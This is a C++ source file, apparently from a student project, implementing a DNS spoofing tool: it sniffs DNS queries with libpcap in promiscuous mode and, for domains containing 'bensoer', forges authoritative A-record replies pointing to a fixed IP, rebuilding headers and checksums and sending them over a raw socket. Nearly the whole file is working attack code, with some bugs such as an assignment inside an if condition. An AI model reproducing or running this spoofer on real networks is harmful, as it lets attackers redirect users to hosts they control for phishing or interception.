//
// Created by bensoer on 18/10/16.
//

#include "NetworkMonitor.h"
#include "Logger.h"
#include "Structures.h"
#include <netinet/udp.h>
#include <netinet/in.h>
#include <iostream>
#include <zconf.h>
#include <dnet.h>
#include <cstring>
#include <netinet/ip.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <string>
#include <stdlib.h>
#include <malloc.h>

/**
 * instance is the instance stored in the network monitor of the netowrk monirot. This is used to enforce a singleton
 * structure
 */
NetworkMonitor * NetworkMonitor::instance = nullptr;

NetworkMonitor::NetworkMonitor() {


    //constructor
    this->rawSocket = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

    // Set SO_REUSEADDR so that the port can be resused for further invocations of the application
    int arg = 1;
    if (setsockopt (this->rawSocket, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1){
        perror("setsockopt");
    }

    //IP_HDRINCL to stop the kernel from building the packet headers
    {
        int one = 1;
        const int *val = &one;
        if (setsockopt(this->rawSocket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
            perror("setsockopt");
    }

}

/**
 * getInstance is a method that generates a new instance of the NetworkMonitor if one does not exist. Otherwise it
 * returns the already created instance. This is used to enforce the singleton structure
 * @return NetworkMonitor - a new or existing instance of the NetworkMontior
 */
NetworkMonitor * NetworkMonitor::getInstance() {
    if(NetworkMonitor::instance == nullptr){
        NetworkMonitor::instance = new NetworkMonitor();
    }

    return NetworkMonitor::instance;
}

void NetworkMonitor::setFilter(string filter) {
    this->filter = filter;
}

/**
 * packetCallback is a statis processing method that is used by libpcap to handle matching packets from the filter.This
 * method parses apart the packet and fetches the data from it. This data is then set and libpcap is stopped so that the
 * command can be processed and replied to.
 * @param ptrnull
 * @param pkt_info
 * @param packet
 */
void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *pkt_info, const u_char *packet){

    //Logger::debug("Packet Found. Now Parsing");

    //struct sniff_ethernet * ethernet = (struct sniff_ethernet*)(packet);
    struct iphdr * ip = (struct iphdr*)(packet + SIZE_ETHERNET);
    //printf("Total Length At Recv: %d\n", ntohs(ip->tot_len));

    //switch the ip now to save us work later

    in_addr_t sa = (in_addr_t)ip->saddr;
    char oldIPSource[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &sa, oldIPSource, INET_ADDRSTRLEN);

    in_addr_t da = (in_addr_t)ip->daddr;
    char oldIPDestination[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &da, oldIPDestination, INET_ADDRSTRLEN);

    //printf("Source: %s\n", oldIPSource);
    //printf("Destination: %s\n", oldIPDestination);


    u_int32_t tmp = ip->saddr;
    ip->saddr = ip->daddr;
    ip->daddr = tmp;
    ip->ttl = 64;

    //printf("IP ID: %d\n", ntohs(ip->id));
    ip->id = htons((rand() % 11000) + 29000);
    ip->frag_off = 0;

    //u_int size_ip = IP_HL(ip) * 4;
    //u_int size_ip = sizeof(*ip) + 2;
    u_int size_ip2 = (ip->ihl & 0xf) * 4;
    u_int size_ip = (ip->ihl) * 4;
    //printf("IHL: %d\n", ip->ihl);
    //printf("size_ip2: %d\n", size_ip2);
    //printf("size_ip: %d\n", size_ip);

    struct udphdr * udp = (struct udphdr *)(packet + SIZE_ETHERNET + size_ip);

    //switch the ports now to save us work later
    int oldDest = ntohs(udp->uh_dport);
    int oldSource = ntohs(udp->uh_sport);
    u_int16_t dest = udp->dest;

    //udp->dest = htons(oldSource);
    udp->dest = htons(oldSource);
    udp->source = htons(oldDest);


    //create dest address struct for sendto
    struct sockaddr_in sin;
    pseudo_header psh;

    sin.sin_family = AF_INET;
    sin.sin_port = htons(oldSource);
    sin.sin_addr.s_addr = inet_addr(oldIPSource);

    //grab the DNS payload out
    struct DNS_HEADER *dns = (struct DNS_HEADER *) (packet + SIZE_ETHERNET + size_ip + sizeof(*udp));
    char *query = (char *)(packet + SIZE_ETHERNET + size_ip + sizeof(*udp) + sizeof(struct DNS_HEADER));

    //change dns question to response
    //dns->qr = 1; //question / response
    //dns->aa = 1; // authoritative
    //dns->tc = 0; //truncated
    dns->ans_count = dns->q_count; //were gonna answer as many questions as there are

    //dns->rd = 0;
    dns->tc = 0;
    dns->aa = 1;
    dns->opcode = 0;
    dns->qr = 1;
    dns->rcode = 0;

    //dns->cd = 1; //non-authenticated data accepted = 1
    if(dns->cd = 0){
        dns->ad = 0;
    }else{
        dns->ad = 1;
    }

    dns->z = 0;
    dns->ra = 0;


    //cout << "---------------------------------------------" << endl;
    //cout << "Structures Found Over Packet" << endl;

    //cout << "Source IP: " << string(oldIPSource) << endl;
    //cout << "Destination IP: " << string(oldIPDestination) << endl;

    //cout << "Source Port: " << oldSource << endl;
    //cout << "Destination Port: " << oldDest << endl;

    //cout << "Transaction ID: " << ntohs(dns->id) << endl;
    //cout << "Questions: " << ntohs(dns->q_count) << endl;
    //cout << "Answer RRs: " << ntohs(dns->ans_count) << endl;
    //cout << "Authority RRs: " << ntohs(dns->auth_count) << endl;
    //cout << "Additional RRs: " << ntohs(dns->add_count) << endl;

    //cout << "RAW Query Content: " << endl;
    //cout << ">" << string(query) << "<" << endl;

    int index = 0;
    QUERY * questionsList = new QUERY[ntohs(dns->q_count)];


    bool foundURL = false; //sets to true when we have found in the question queries the domain we want to spoof
    char * ptr = query;
    //Now parse questions out
    for(int i = 0; i < ntohs(dns->q_count); ++i){

        bool keepProcessing = true;
        string queryName = "";
        string rawName="";
        bool isFirst = true;
        while(keepProcessing){

            rawName += (*ptr);
            int len = (int)(*ptr);
            //cout << "To Read In Segment. Length Is: >" << len << "< Bytes Long" << endl;

            //if this is the first one or the last one. don't put a dot
            if(isFirst || len == 0){
                isFirst = false;
            }else{
                queryName += ".";
            }

            if(len == 0){
                //cout << "Length Is Zero. This Means Were Done" << endl;
                break;
            }else{

                ptr++;
                //char * segment = new char[len];
                //memset(segment, 0, len);
                string segment = "";
                for(int i = 0; i < len; ++i){
                    char c = (*ptr);
                    rawName += c;
                    //cout << "Character Is: >" << c << "<" << endl;
                    segment += c;
                    ptr++;
                }
                //segment[i] = '\0';

                //cout << "Parsed Out Segment Is: >" << segment << "<" << endl;
                queryName += segment;
            }

        }

        ++ptr; // pointer is now looking at header information for question
        struct QUESTION * question = (struct QUESTION *)ptr;
        QUERY * questionQuery = new QUERY;
        questionQuery->rawName = rawName;
        questionQuery->name = queryName;
        questionQuery->ques = question;
        questionsList[index++] = (*questionQuery);

        //cout << "Full Query Name: " << questionQuery->name << endl;
        //cout << "Class " << ntohs(questionQuery->ques->qclass) << endl;
        //cout << "Type " << ntohs(questionQuery->ques->qtype) << endl;

        if(questionQuery->name.find("bensoer") != string::npos){
            foundURL = true;
        }

        ptr += sizeof(struct QUESTION); //move the pointer past this section

    }

    //cout << "ALL DONE PARSING PACKET. NOW CHECKING IF SHOULD SPOOF" << endl;
    if(foundURL){
        //cout << "REQUEST BELONGS TO DESIRED SPOOF. SENDING RESPONSE" << endl;
    }else{
        return;
    }

    //cout << "NOW TO SEND THE RESPONSE" << endl;

    //make our response packet. get it ready
    char responsePacket[65535];
    memset(responsePacket, 0, 65535);
    //copy everything we have anyway on the dealio
    memcpy(responsePacket, packet + SIZE_ETHERNET, pkt_info->len);

    //get pointer to the end
    unsigned long addrDif = (const u_char *)ptr - (packet + SIZE_ETHERNET);
    char * responsePtr = responsePacket;
    responsePtr += addrDif;

    int questionListContentSize = 0;
    for(int i = 0; i < ntohs(dns->q_count); ++i){

        short hex = 0x0CC0;
        memcpy(responsePtr, &hex, 2);
        responsePtr += 2;
        questionListContentSize += 2;

        struct R_DATA * fakeResponse = (struct R_DATA *)responsePtr;
        fakeResponse->type = htons(T_A);
        fakeResponse->_class = htons(1);
        fakeResponse->ttl = htonl(300);
        fakeResponse->data_len = htons(4); //need to be fixed;
        fakeResponse->address = inet_addr("142.232.66.1");
        //YAHOO: 206.190.36.45

        //copy in the fake response ?
        memcpy(responsePtr, fakeResponse, sizeof(struct R_DATA));

        responsePtr += sizeof(struct R_DATA);
    }

    //recalc ip length
    struct iphdr * rip = (struct iphdr*)(responsePacket);
    rip->tot_len = htons( ntohs(ip->tot_len) + (( ntohs(dns->q_count) * sizeof(struct R_DATA)) + questionListContentSize));
    //cout << "Original IP Length: " << ntohs(ip->tot_len) << endl;
    //cout << "Response IP Length: " << ntohs(rip->tot_len) << endl;

    rip->check = 0;
    rip->check = NetworkMonitor::instance->csum((unsigned short *) responsePacket, sizeof(struct iphdr));

    //recalc udp length
    struct udphdr * rudp = (struct udphdr *)(responsePacket + size_ip);
    unsigned short newLength = ntohs(udp->len) + ( ( ntohs(dns->q_count) * sizeof(struct R_DATA) ) + questionListContentSize);
    rudp->len = htons( ntohs(udp->len) + ( ( ntohs(dns->q_count) * sizeof(struct R_DATA) ) + questionListContentSize) );
    //cout << "Original UDP Length: " << ntohs(udp->len) << endl;
    //cout << "Response UDP Length: " << ntohs(rudp->len) << endl;


    rudp->check = 0;
    rudp->uh_sum = 0;

    //calculate new checksum for pseudoheader
    psh.dest_address = sin.sin_addr.s_addr;
    psh.source_address = inet_addr(oldIPDestination);
    psh.placeholder = 0;
    psh.protocol = IPPROTO_UDP;
    psh.udp_length = htons(newLength);

    //pseudogram generation
    int psize = sizeof(struct pseudo_header) + newLength;
    char * pseudogram = (char *)malloc(psize);
    memcpy(pseudogram, (char*) &psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), rudp, newLength);

    rudp->check = NetworkMonitor::instance->csum((unsigned short *) pseudogram, psize);

    //printf("IP Checksum Hex: %x\n", rip->check);
    //printf("UDP Checksum Hex: %x\n", rudp->check);
    //printf("UDP Checksum Hex: %x\n", rudp->uh_sum);

    //time to send this garbage
    ssize_t result = sendto(NetworkMonitor::instance->rawSocket, responsePacket, ntohs(rip->tot_len), 0, (struct sockaddr *) &sin, sizeof(sin));
    if(result < 0){
        perror("sendto");
    }

    return;

}

/**
 * killListening is a helepr method so that the client can tell the NetworkMontior and libpcap to stop listening for
 * packets
 */
void NetworkMonitor::killListening() {
    if(this->currentFD != nullptr){
        pcap_breakloop(this->currentFD);
    }
}

/**
 * listenForTraffic is the main functionality method of the NetworkMonitor. This function takes the passed in listening
 * interface and using the configuration filter, configured libpcap to start listening for packets on the interface. The
 * NetworkMonitor::packetCallback is then called as each packet is found that matches the filter
 * @param listeningInterface pcap_if_t - The interface to listen for packets on
 * @return String - The parsed command that has been received from the network
 */
string NetworkMonitor::listenForTraffic(pcap_if_t * listeningInterface) {

    char errbuf[PCAP_ERRBUF_SIZE];
    bpf_u_int32 subnetMask;
    bpf_u_int32 ip;

    //fetch network information for interface
    pcap_lookupnet(listeningInterface->name, &subnetMask, &ip, errbuf);

    //open up a raw socket and listen in promisc mode on it for data

    if((this->currentFD = pcap_open_live(listeningInterface->name, BUFSIZ, 1, -1, errbuf)) == NULL){
        Logger::error("NetworkMonitor:listenForTraffic - There Was An Error in pcap_open_live");
        Logger::error(string(errbuf));
        return "-1";
    }

    //setup the libpcap filter
    struct bpf_program fp;
    //compile the filter
    if(pcap_compile(this->currentFD, &fp, this->filter.c_str(), 0, ip) == -1){
        Logger::error("NetworkMonitor:listenForTraffic - There Was An Error Compiling The Filter");
        return "-1";
    }
    //set the filter
    if(pcap_setfilter(this->currentFD, &fp) == -1){
        Logger::error("NetworkMonitor:listenForTraffic - There Was An Error Setting The Filter");
        return "-1";
    }

    u_char* args = NULL;
    //listen for UDP packets
    pcap_loop(this->currentFD, 0, NetworkMonitor::packetCallback, args);

    if(this->data == nullptr){
        return "";
    }else{
        return (*this->data);
    }

}

/**
 * csum is a helper method that generates the checksum needed for the response packet to be validated and sent
 * by the network stack
 * @param ptr
 * @param nbytes
 * @return
 */
unsigned short NetworkMonitor::csum (unsigned short *ptr,int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}

typedef unsigned short u16;
typedef unsigned long u32;

unsigned short NetworkMonitor::udp_sum_calc(unsigned short len_udp, unsigned short src_addr[],unsigned short dest_addr[], bool padding, unsigned short buff[])
{
    unsigned short prot_udp=17;
    unsigned short padd=0;
    unsigned short word16;
    unsigned long sum;

    // Find out if the length of data is even or odd number. If odd,
    // add a padding byte = 0 at the end of packet
    if (padding&1==1){
        padd=1;
        buff[len_udp]=0;
    }

    //initialize sum to zero
    sum=0;

    // make 16 bit words out of every two adjacent 8 bit words and
    // calculate the sum of all 16 vit words
    for (unsigned int i=0;i<len_udp+padd;i=i+2){
        word16 =((buff[i]<<8)&0xFF00)+(buff[i+1]&0xFF);
        sum = sum + (unsigned long)word16;
    }
    // add the UDP pseudo header which contains the IP source and destinationn addresses
    for (unsigned int i=0;i<4;i=i+2){
        word16 =((src_addr[i]<<8)&0xFF00)+(src_addr[i+1]&0xFF);
        sum=sum+word16;
    }
    for (unsigned int i=0;i<4;i=i+2){
        word16 =((dest_addr[i]<<8)&0xFF00)+(dest_addr[i+1]&0xFF);
        sum=sum+word16;
    }
    // the protocol number and the length of the UDP packet
    sum = sum + prot_udp + len_udp;

    // keep only the last 16 bits of the 32 bit calculated sum and add the carries
    while (sum>>16)
        sum = (sum & 0xFFFF)+(sum >> 16);

    // Take the one's complement of sum
    sum = ~sum;

    return ((unsigned short) sum);
}